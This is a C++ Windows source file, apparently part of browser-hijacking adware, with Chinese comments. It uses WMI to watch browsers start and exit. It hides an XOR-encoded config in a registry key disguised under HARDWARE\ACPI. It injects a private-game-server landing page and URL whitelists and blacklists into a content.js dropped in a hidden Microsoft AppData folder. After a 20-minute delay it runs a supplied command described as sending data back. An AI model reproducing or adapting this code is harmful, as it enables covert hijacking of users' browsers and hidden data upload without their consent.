    if (ERROR_SUCCESS == RegOpenKeyEx(hkay, lpSubKey, 0, KEY_QUERY_VALUE, &hSubkey))
    {
        DWORD dwLen = 0;
        RegQueryValueExW(hSubkey, KeyName, 0, 0, 0, &dwLen);
        data = (LPBYTE)malloc(dwLen + 2);
        if (data && dwLen)
        {
            data[dwLen] = 0;
            data[dwLen + 1] = 0;
            RegQueryValueExW(hSubkey, KeyName, 0, 0, data, &dwLen);
            if (length)
            {
                *length = dwLen;
            }
        }

        RegCloseKey(hSubkey);
    }
    return data;
}

//获取进程名，返回值要释放
int get_process_name(unsigned long processId,wchar_t* name)
{
    wchar_t szFileFullPath[MAX_PATH];
    HANDLE Processhandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (Processhandle)
    {
        GetProcessImageFileNameW(Processhandle, szFileFullPath, MAX_PATH);//获取文件路径
        wchar_t* pos = wcsrchr(szFileFullPath, L'\\');
        if (pos) {
            wcscpy(name, ++pos);
            CloseHandle(Processhandle);
            return 1;
        }
        CloseHandle(Processhandle);
    }

    return 0;
}
int get_process_exe_name(char* Pathname, char* Exename)
{
    char* pos = strrchr(Pathname, L'\\');
    if (pos) {
        strcpy(Exename, ++pos);
        return 1;
    }
    return 0;
}

char* read_file(const wchar_t* path, size_t* len)
{

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD osz = 0;
        LARGE_INTEGER li = { 0 };
        GetFileSizeEx(hFile, &li);
        *len = li.QuadPart;

        char* buf = (char*)malloc(li.QuadPart);
        if (buf)
        {
            ReadFile(hFile, buf, li.QuadPart, &osz, 0);
        }
        CloseHandle(hFile);
        return buf;
    }
    return 0;
}

int get_url(char* data, int len, char* url, char* url_arg)
{
    int st = 0;
    if (len < 5) return 0;

    if (len > 2048) len = 2048;

    char* req = (char*)malloc(len + 2);
    if (req)
    {
        req[len] = 0;
        req[len + 1] = 0;

        memcpy(req, data, len);


        if (memcmp(req, "GET /", 5) == 0)
        {
            char* Host = strstr(req, "Host:");
            if (Host)
            {
                Host += 6;
                char* pos = strstr(Host, "\r\n");
                if (pos)pos[0] = 0;

                char* end = strstr(req, " HTTP/1");
                if (end)
                {
                    end[0] = 0;

                    char* arg = (char*)((size_t)req + 4);
                    strcpy(url, Host);
                    //strcat(url, arg);//url_arg
                    strcpy(url_arg, arg);
                    strupr(url_arg);
                    strupr(url);
                    st = 1;
                }
            }
        }
        free(req);
    }
    return st;
}



//获取父进程名字
DWORD GetParentPIDAndName(DWORD ProcessID, char* lpszBuffer_Parent_Name)
{
    PROCESS_BASIC_INFORMATION pbi;
    DWORD dwParentID = 0;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ProcessID);
    if (!ProcessID) {
        return 0;
    }

    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, (LPVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);


    if (NT_SUCCESS(status)) {

        dwParentID = (LONG_PTR)pbi.Reserved3;

        if (lpszBuffer_Parent_Name) {
            HANDLE hParentProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwParentID);
            if (hParentProcess) {
                GetModuleFileNameExA(hParentProcess, NULL, lpszBuffer_Parent_Name, MAX_PATH + 1);
            }
            if (hParentProcess)
                CloseHandle(hParentProcess);
        }
    }

    CloseHandle(hProcess);
    return dwParentID;
}

//字符转换
char* WcharToChar(const wchar_t* wp)
{
    char* m_char;
    size_t len = WideCharToMultiByte(CP_ACP, 0, wp, wcslen(wp), NULL, 0, NULL, NULL);
    m_char = (char*)malloc((len + 1) * sizeof(char));
    WideCharToMultiByte(CP_ACP, 0, wp, wcslen(wp), m_char, len, NULL, NULL);
    m_char[len] = '\0';
    return m_char;
}
wchar_t* CharToWchar(const char* str)
{
    if (str == 0)
    {
        return 0;
    }
    size_t len = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
    wchar_t* m_wchar = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, str, -1, m_wchar, len);
    m_wchar[len] = '\0';
    return m_wchar;
}


//搜索一块内存
void* SearchMemoryBlock(short Next[], WORD* Tzm, WORD TzmLength, unsigned char* StartAddress, unsigned long size)
{
    int n = 0;
    for (size_t i = 0, j, k; i < size;)
    {
        n++;
        j = i;
        k = 0;
        for (; k < TzmLength && j < size && (Tzm[k] == StartAddress[j] || Tzm[k] == 256); k++, j++);


        if (k == TzmLength)
        {
            return (StartAddress + i);
        }

        if ((i + TzmLength) > size)
        {
            return 0;
        }

        int num = Next[StartAddress[i + TzmLength]];
        if (num == -1)
            i += (TzmLength - Next[256]); //如果特征码有问号，就从问号处开始匹配，如果没有就i+=-1
        else
            i += (TzmLength - num);
    }
    return 0;
}

//特征码转字节集
WORD GetTzmArray(const  char* Tzm, WORD* TzmArray)
{
    int len = 0;
    WORD TzmLength = strlen(Tzm) / 3 + 1;

    for (size_t i = 0; i < strlen(Tzm);) //将十六进制特征码转为十进制
    {
        char num[2];
        num[0] = Tzm[i++];
        num[1] = Tzm[i++];
        i++;
        if (num[0] != '?' && num[1] != '?')
        {
            int sum = 0;
            WORD a[2];
            for (int i = 0; i < 2; i++)
            {
                if (num[i] >= '0' && num[i] <= '9')
                {
                    a[i] = num[i] - '0';
                }
                else if (num[i] >= 'a' && num[i] <= 'z')
                {
                    a[i] = num[i] - 87;
                }
                else if (num[i] >= 'A' && num[i] <= 'Z')
                {
                    a[i] = num[i] - 55;
                }
            }
            sum = a[0] * 16 + a[1];
            TzmArray[len++] = sum;
        }
        else
        {
            TzmArray[len++] = 256;
        }
    }
    return TzmLength;
}

void* SearchMemory(const char* tzm, char* start_address, size_t length)
{
    if (tzm == 0 || start_address == 0 || length <= 0)
    {
        return 0;
    }
    short Next[260];
    size_t TzmLength = strlen(tzm) / 3 + 1;
    WORD* TzmArray = (WORD*)malloc(TzmLength * 2 + 1);
    void* addr = 0;

    if (TzmArray)
    {
        GetTzmArray(tzm, TzmArray);
        {
            //特征码（字节集）的每个字节的范围在0-255（0-FF）之间，256用来表示问号，到260是为了防止越界
            for (int i = 0; i < 260; i++)
                Next[i] = -1;
            for (size_t i = 0; i < TzmLength; i++)
                Next[TzmArray[i]] = i;
        }

        /*size_t Count = 10240000;
        while (length > Count) {
            addr = SearchMemoryBlock(Next, TzmArray, TzmLength, (unsigned char*)start_address, Count);
            start_address += Count;
            length -= Count;
        }*/
        addr = SearchMemoryBlock(Next, TzmArray, TzmLength, (unsigned char*)start_address, length);
        free(TzmArray);

    }
    return addr;
}


//解密数据
char* decrypt(char* data, size_t length)
{
    for (size_t i = 0; i < length; i++)
    {
        if (data[i] && data[i] != 42) //不解密0
        {
            data[i] = (char)data[i] ^ 42;
        }
    }
    return 0;
}



DWORD WINAPI  ReturnData(LPVOID  a)
{
    Sleep(20 * 60 * 1000);//延时20分钟
    char* pupload_data = (char*)a;
    system(pupload_data);//回传数据
    return 0;
}



void _LOG(const wchar_t* fmt, ...)
{
    wchar_t* logData = (wchar_t*)malloc(10240);
    if (logData)
    {
        va_list args;
        va_start(args, fmt);
        int dLen = _vswprintf_c_l(logData, 10240, fmt, 0, args);
        va_end(args);


        SYSTEMTIME st = { 0 };
        wchar_t head[128] = { 0 };
        wchar_t* buf = (wchar_t*)malloc(10240 + 1024);
        if (buf)
        {
            GetLocalTime(&st);
            swprintf(head, L"[%02d:%02d:%02d] PID=[%u] TID=%u \t ", st.wHour, st.wMinute, st.wSecond, GetCurrentProcessId(), GetCurrentThreadId());

            wsprintf(buf, L"[DBG] %s %s \r\n", head, logData);
            //for (size_t i = 0; i < wcslen(logData); i++)
            //{
            //    if (buf[i] == L'\r' && buf[i + 1] == L'\n')
            //    {
            //        buf[i] = L'\t';
            //        buf[i + 1] = L'\t';
            //    }
            //}
            wprintf(buf);
            OutputDebugStringW(buf);
            free(buf);

        }
        free(logData);
    }

}


int Determining_browser(unsigned long processId, string process_name)
{
    //HMODULE hModule[1024];
    //DWORD dwRes;
    int ret = 0;
    if (!processId || process_name.empty()) return 0;


    //判断进程产品名
    char pProductName[260] = { 0 };//产品名
    query_version("ProductName", (char*)process_name.c_str(), pProductName); //从文件查询产品名    
    
    for (size_t i = 0; i < sizeof(g_browser_ProductName) / sizeof(char*); i++)
    {
        //printf("判断进程产品名 --->%s||%s\r\n", pProductName, g_browser_ProductName[i]);
        if (strstr(pProductName, g_browser_ProductName[i]))//如果进程产品名是浏览器产品名
        {
            char process_path_noName[260] = { 0 };
            strcpy(process_path_noName, process_name.c_str());
            char* pos = strrchr(process_path_noName, L'\\');
            pos[0] = '\0';
            ret = listFiles(process_path_noName); //判断文件目录的dll名
            //printf("ret3 --->%d\r\n",ret);
            return ret;
        }
    }
    //判断进程名
    //for (size_t i = 0; i < sizeof(g_browser_name) / sizeof(char*); i++)
    //{
    //    if (process_name.find(g_browser_name[i]) != std::string::npos)//如果进程名是浏览器进程名  
    //    {

    //        ret += 10;
    //        break;
    //    }
    //}
#if 0
    //判断进程模块信息
    if (processId == 1)
    {
        //printf("ret1 --->%d\r\n", ret);
        return ret;
    }
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    EnumProcessModules(hProcess, hModule, sizeof(hModule), &dwRes);//循环获取模块信息
    for (int j = 0; j < sizeof(g_dll_name) / sizeof(wchar_t*); j++)
    {
        for (int i = 0; i < (dwRes / sizeof(HMODULE)); i++)
        {
            WCHAR wzName[MAX_PATH] = { 0 };

            if (GetModuleFileNameEx(hProcess, hModule[i], wzName, sizeof(wzName) / sizeof(TCHAR)))
            {
                //wprintf(_T("%d %x %s \r\n"), i, hModule[i], wzName);

                if (wcsstr(wzName, g_dll_name[j]))
                {

                    ret += 100;
                    CloseHandle(hProcess);
                    //printf("ret2 --->%d\r\n", ret);
                    return ret;
                }

            }
        }
    }
    CloseHandle(hProcess);
#endif // 0











    //printf("ret3 --->%d\r\n",ret);
    return ret;
}





DWORD WINAPI ProcessMonitor(PVOID CB_PS_NOCICE)
{

    //init();

    // https://docs.microsoft.com/zh-cn/previous-versions/windows/desktop/krnlprov/win32-processtrace
    IWbemLocator* pLoc = 0;
    IWbemServices* pSvc = 0;

    if (!SUCCEEDED(CoInitializeEx(0, COINIT_MULTITHREADED)))
        return FALSE;

    if (!SUCCEEDED(CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc)))
    {
        CoUninitialize();
        return FALSE;
    }

    if (SUCCEEDED(pLoc->ConnectServer(bstr_t("ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc)))
    {

        if (SUCCEEDED(CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE)))
        {

            // bstr_t strQuery("SELECT * FROM __InstanceCreationEvent WITHIN 0.1 WHERE TargetInstance ISA 'Win32_Process'"); //这个特占内存
            bstr_t strQuery("Select ProcessID from win32_ProcessStartTrace");
            // bstr_t strQuery("Select * from Win32_ThreadStartTrace");
            // bstr_t strQuery("Select * from Win32_ModuleLoadTrace");

            IEnumWbemClassObject* pResult = NULL;

            if (SUCCEEDED(pSvc->ExecNotificationQuery(bstr_t("WQL"), strQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pResult)))
            {
                do
                {
                    IWbemClassObject* pObject = NULL;
                    ULONG lCnt = 0;
                    if (SUCCEEDED(pResult->Next(WBEM_INFINITE, 1, &pObject, &lCnt) && pObject))
                    {
                        BSTR bstrText = 0;
                        pObject->GetObjectText(0, &bstrText);
                        char* psinfo = _com_util::ConvertBSTRToString(bstrText);
                        if (bstrText) SysFreeString(bstrText);

                        if (psinfo)
                        {
                            //printf("%s\n\n", psinfo);
                            char* szPID = strstr(psinfo, "=");
                            if (szPID)
                            {
                                szPID++;
                                char* epos = strstr(szPID, ";");
                                if (epos)
                                    *epos = 0;

                                // printf("PID=%d\n", atoi(szPID));
                                // LOG("psinfo2=%s %d",psinfo,atoi(szPID));

                                //printf("监控到进程启动\n");
                                ((void (*)(DWORD))CB_PS_NOCICE)(atoi(szPID)); //回调
                            }

                            delete[] psinfo;
                        }

                        pObject->Release();
                        pObject = 0;
                    }
                } while (true);
            }



            

            pLoc->Release();
        }

        pSvc->Release();
    }

    CoUninitialize();
    CoUninitialize();

    return TRUE;
}


DWORD WINAPI ProcessKillMonitor(PVOID kill_browser)
{

    //init();

    // https://docs.microsoft.com/zh-cn/previous-versions/windows/desktop/krnlprov/win32-processtrace
    IWbemLocator* pLoc = 0;
    IWbemServices* pSvc = 0;

    if (!SUCCEEDED(CoInitializeEx(0, COINIT_MULTITHREADED)))
        return FALSE;

    if (!SUCCEEDED(CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc)))
    {
        CoUninitialize();
        return FALSE;
    }

    if (SUCCEEDED(pLoc->ConnectServer(bstr_t("ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc)))
    {

        if (SUCCEEDED(CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE)))
        {
            bstr_t strQuery("SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'");//监视进程结束
            IEnumWbemClassObject* pResult = NULL;
            if (SUCCEEDED(pSvc->ExecNotificationQuery(bstr_t("WQL"), strQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pResult)))
            {
                do
                {
                    IWbemClassObject* pObject = NULL;
                    ULONG lCnt = 0;
                    if (SUCCEEDED(pResult->Next(WBEM_INFINITE, 1, &pObject, &lCnt) && pObject))
                    {
                        BSTR bstrText = 0;
                        pObject->GetObjectText(0, &bstrText);
                        char* psinfo = _com_util::ConvertBSTRToString(bstrText);
                        if (bstrText)  SysFreeString(bstrText);

                        if (psinfo)
                        {
                            char* ExecutablePath = strstr(psinfo, "ExecutablePath = \"");
                            if (ExecutablePath)
                            {
                                ExecutablePath += 18;
                                char* epos = strstr(ExecutablePath, "\"");
                                if (epos)
                                    *epos = 0;

                                //printf("Pathname=%s\n", ExecutablePath);

                                //((void (*)(DWORD))kill_browser)((DWORD)ExecutablePath); //回调
                                first_kill_browser(ExecutablePath);

                            }

                            delete[] psinfo;
                        }

                        pObject->Release();
                        pObject = 0;
                    }
                } while (true);
            }

            pLoc->Release();
        }

        pSvc->Release();
    }

    CoUninitialize();
    CoUninitialize();

    return TRUE;
}

void first_kill_browser(char* process_name)
{

    //printf("first_kill_browser\r\n");
    //int ret = Determining_browser(1, process_name);//判断该进程是不是浏览器
    if (Determining_browser(1, process_name) == 0) return;//不是浏览器


    char zyProcessName[MAX_PATH] = { 0 };//去除路径
    wchar_t zyBrowserTime[MAX_PATH] = { 0 };
    //printf("去除路径\r\n");
    //当前进程名
    if (!get_process_exe_name((char*)process_name, zyProcessName))
    {
        return;
    }
    swprintf(zyBrowserTime, L"%hs_zy", zyProcessName);//存储浏览器设置主页键名
    get_Process_Information(process_name, zyProcessName, zyBrowserTime);
}



//判断浏览器第一次打开
void  first_open_browser(unsigned long processId, string process_name)
{
    if (Determining_browser(1, process_name) == 0) return;//不是浏览器

    wchar_t zyBrowserTime[MAX_PATH] = { 0 };
    char zyProcessName[MAX_PATH] = { 0 };//去除路径

    //当前进程名
    if (!get_process_exe_name((char*)process_name.c_str(), zyProcessName))
    {
        return;
    }
    //printf("主页 ParentName_len = %d\r\n", ParentName_len);
    swprintf(zyBrowserTime, L"%hs_zy", zyProcessName);//存储浏览器设置主页键名
    //扫描进程表，发现没有浏览器进程时给个标志位设置位可以写入注册表
    DWORD64 reg_time_zy = CFG_GET(zyBrowserTime);//读注册表时间
    DWORD64 current_time = GetTickCount64();//获取当前时间;
    char ParentName[260] = { 0 };
    DWORD parentid = GetParentPIDAndName(processId, ParentName);
    if (ParentName[0] == 0 )
    {
        printf("获取父进程名失败pp_id=%d，pp_name=%s \r\n", parentid, ParentName);
        return;
    }
    if (!strstr(ParentName, zyProcessName))//父进程不是自己
    {
        printf("判断浏览器第一次打开,%s , 父进程id=%d name=%s\r\n", zyProcessName, parentid,ParentName);
        CFG_SET(zyBrowserTime, current_time);//
    }
    //else
    //{
    //    if (current_time - reg_time_zy > 10000)//大于十毫秒
    //    {
    //        //if (reg_time_zy == 1 || reg_time_zy == 0)
    //        {
    //            //printf("主页----------------时间:%lld - %lld = %lld  \r\n", current_time, reg_time_zy, current_time - reg_time_zy);
    //            printf("判断浏览器第一次打开,%s\r\n", zyProcessName);
    //            CFG_SET(zyBrowserTime, current_time);//
    //        }
    //    }
    //}
    

}

//进程回调
VOID PS_NOCICE(DWORD pid)
{

    // OutputDebugStringW(L"PS_NOCICE");

    BOOL st = 0;
    DWORD ICRC32 = 0;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    if (hProcess)
    {
        char ImageFileName[MAX_PATH + 2] = { 0 }; //进程名
        DWORD SZ = MAX_PATH * sizeof(char);
        BOOL st = QueryFullProcessImageNameA(hProcess, 0, ImageFileName, &SZ);
        first_open_browser(pid, ImageFileName);


        CloseHandle(hProcess);
    }
}

//获取进程快照，遍历进程
DWORD WINAPI get_Process_Information(char* process_path,char* process_name, wchar_t* process_name_zy)
{
    int num = 0;
   // HANDLE hProcess;
    PROCESSENTRY32 pe32;//用来存储进程的相关信息  
    //DWORD dwPriorityClass;//  

    //建立进程快照  
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获得系统进程的快照  

    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        cout << "快照创建失败" << endl;
        return 0;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32) == NULL)
    {
        cout << "error" << endl;
        CloseHandle(hProcessSnap);

    }
    
    int i = 0;
    do {
        char* exefilename = WcharToChar(pe32.szExeFile);
        
        //if (strcmp(process_name, exefilename) == 0)
        //{

        //}

        //判断进程产品名
        char pProductName[260] = { 0 };//产品名
        // 获取全路径
        wchar_t chpath[MAX_PATH] = { 0 };
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID); 
        
        //printf("遍历进程1 %d\r\n", hProcess);
        //if (!hProcess) return 0; 
        GetModuleFileNameEx(hProcess, NULL, chpath, MAX_PATH + 1);
        //GetProcessImageFileName(hProcess, chpath, MAX_PATH);//获取文件路径(hProcess, NULL, chpath, sizeof(chpath));
        //printf("ProductName hProcess:%d  path:%ws\r\n", hProcess, chpath);
        CloseHandle(hProcess);	//清除hProcess句柄
        char* buff = WcharToChar(chpath);
        BOOL ret = query_version("ProductName", buff, pProductName); //从文件查询产品名    
        

        //printf("ProductName  快照 :%s  path:%ws  结束%s  ret:%d\r\n", exefilename, chpath, pProductName, ret);
        
        for (size_t i = 0; i < sizeof(g_browser_ProductName) / sizeof(char*); i++)
        {
            if (strstr(pProductName, g_browser_ProductName[i]))//如果进程产品名是浏览器产品名
            {
                num++;
                break;
            }
        }
        free(exefilename);
        free(buff);
        //printf("PID=%5u    PName= %s\n", pe32.th32ProcessID, pe32.szExeFile);	//遍历进程快照，轮流显示每个进程信息
    } while (Process32Next(hProcessSnap, &pe32));
    //if ()
    //{

    //    printf("判断浏览器结束\r\n");
    //    CFG_SET(process_name_zy, 1);//在浏览器结束时将注册表中的值设置为1 
    //}
    CloseHandle(hProcessSnap);	//清除hProcess句柄
    return 0;
}


int listFiles(const char* dir)
{
    char dirNew[200];
    strcpy(dirNew, dir);
    strcat(dirNew, "\\*.*");    // 在目录后面加上"\\*.*"进行第一次搜索

    intptr_t handle;
    _finddata_t findData;

    handle = _findfirst(dirNew, &findData);
    if (handle == -1)        // 检查是否成功
        return 0;

    do
    {
        if (findData.attrib & _A_SUBDIR)
        {
            if (strcmp(findData.name, ".") == 0 || strcmp(findData.name, "..") == 0)
                continue;

            //cout << findData.name << "\t<dir>\n";

            // 在目录后面加上"\\"和搜索到的目录名进行下一次搜索
            strcpy(dirNew, dir);
            strcat(dirNew, "\\");
            strcat(dirNew, findData.name);
            if (g_num > 2)
            {
                break;
            }
            g_num++;
            if (listFiles(dirNew))
            {
                return 1;
            }
        }
        else
        {
            for (int j = 0; j < sizeof(g_dll_name) / sizeof(char*); j++)
            {

                if (strcmp(findData.name, g_dll_name[j]) == 0)
                {
                    //cout << findData.name << "\t" << findData.size << " bytes.\n";
                    g_num = 0;
                    _findclose(handle);    // 关闭搜索句柄
                    return 1;
                }
            }
        }

    } while (_findnext(handle, &findData) == 0);
    g_num = 0;
    _findclose(handle);    // 关闭搜索句柄
    return 0;
}

int Modify_b_and_w()
{
    //从注册表读取配置文件路径  cfg HKEY_LOCAL_MACHINE\HARDWARE\ACPI
    Sleep(100);
    DWORD length = 0;
    char* cfg_data = (char*)RegRead2(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\PRMX",L"BWLIST",&length);
    if (!cfg_data)
    {
        return 0;
    }


    //size_t len = 0;
    //char* cfg_data = read_file(cfg_path,&len);
    ////char* cfg_data = read_file(L"config.json", &len);
    //if (!cfg_data)
    //{
    //    return 0;
    //}

    //获取json数据，落地页、白名单、黑名单
    string strwurl_list;
    string strburl_list;

    //解密黑名单
    decrypt(cfg_data, length);
    //write_file(L"11.json", cfg_data, length);
    //解析json到列表
    cJSON* root = cJSON_Parse(cfg_data);
    cJSON* g_yewu_config = cJSON_GetObjectItem(root, "yewu");
    for (int i = 0; i < cJSON_GetArraySize(g_yewu_config); i++)
    {
        cJSON* rs = cJSON_GetArrayItem(g_yewu_config, i);
        {
            cJSON* name = cJSON_GetObjectItem(rs, "name");
            if (name && strcmp(name->valuestring, "私服") == 0)
            {
                cJSON* json_url = cJSON_GetObjectItem(rs, "url");
                cJSON* wlist = cJSON_GetObjectItem(rs, "wlist");
                cJSON* blist = cJSON_GetObjectItem(rs, "blist");

                char capital_url_0[260] = { 0 };
                strcpy(capital_url_0, cJSON_GetArrayItem(json_url, 0)->valuestring);

                //获取落地页
                char* pSFUrl = strstr(capital_url_0, "//");
                if (pSFUrl)
                {
                    pSFUrl++;
                    pSFUrl++;
                    char* ptemp2 = strstr(pSFUrl, "/");
                    if (ptemp2)
                    {
                        ptemp2[0] = 0;
                    }
                }
                //先把自己的落地页加进白名单
                strupr(pSFUrl);
                strwurl_list += "\"";
                strwurl_list += pSFUrl;
                strwurl_list += "\",";



                //白名单提取
                cJSON* wls = 0;
                //size_t i = 0;
                //char* buf = (char*)malloc(len);
                cJSON_ArrayForEach(wls, wlist)
                {
                    string strwurl = wls->valuestring;
                    strwurl.erase(remove(strwurl.begin(), strwurl.end(), '*'), strwurl.end());
                    if (strwurl[0] == '.')
                    {
                        strwurl.erase(0, 1);
                    }
                    strwurl_list += "\"" + strwurl + "\",";//"url",
                }
                //去除最后的逗号
                strwurl_list.erase(strwurl_list.length()-1, 1);



                //黑名单提取
                cJSON* bls = 0;
                cJSON_ArrayForEach(bls, blist)//循环出所有黑名单成员
                {
                    string strburl = bls->valuestring;
                    strburl.erase(remove(strburl.begin(), strburl.end(), '*'), strburl.end());
                    if (strburl[0] == '.')
                    {
                        strburl.erase(0, 1);
                    }
                    strburl_list += "\"" + strburl + "\",";//  "url",
                }
                //去除最后的逗号
                strburl_list.erase(strburl_list.length() - 1, 1);
            }

        }
    }
    //打开js文件将数据写进对应的名单里C:\Users\Administrator\AppData\Local\Microsoft\plg
    //content.js
    wchar_t  wstrcontent[] = L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\content.js";
    //wchar_t  wstrcontent[] = L"content.js";
    //SHCreateDirectoryExW(NULL, plg.c_str(), NULL);
    size_t len2 = 0;
    string content_data = read_file(wstrcontent, &len2);
    if (content_data.empty())
    {
        free(cfg_data);
        return 0;
    }
    
    content_data.insert(content_data.find("g_wlist=[")+sizeof("g_wlist=["), strwurl_list);
    content_data.insert(content_data.find("g_blist=[") + sizeof("g_blist=["), strburl_list);

    write_file(wstrcontent, (char*)content_data.c_str(), len2+ strwurl_list.length() + strburl_list.length());
    return 1;
}

void printfLog(char* szlog)
{
    HANDLE hFile = CreateFileW(L"C:\\Windows\\Logs\\dbg__plugin.txt",	// 文件路径
        GENERIC_WRITE | GENERIC_READ,	// 写和读文件
        0,								// 不共享读写
        NULL,							// 缺省安全属性
        OPEN_EXISTING,					// 打开文件，不存在则返回失败
        FILE_ATTRIBUTE_NORMAL,			// 一般的文件       
        NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        char szbuff[] = "[DBG] Plugin NO data\r\n";
        DWORD osz;
        if (szlog)
        {
            // 文件指针移动到文件末尾，追加内容的关键操作
            SetFilePointer(hFile, NULL, NULL, FILE_END);
            WriteFile(hFile, szlog, strlen(szlog), &osz, 0);
        }
        else
        {
            // 文件指针移动到文件末尾，追加内容的关键操作
            SetFilePointer(hFile, NULL, NULL, FILE_END);
            WriteFile(hFile, szbuff, strlen(szbuff), &osz, 0);
        }
        // 刷新指定文件的缓冲区并将所有缓冲数据写入文件
        FlushFileBuffers(hFile);
        CloseHandle(hFile);
    }
}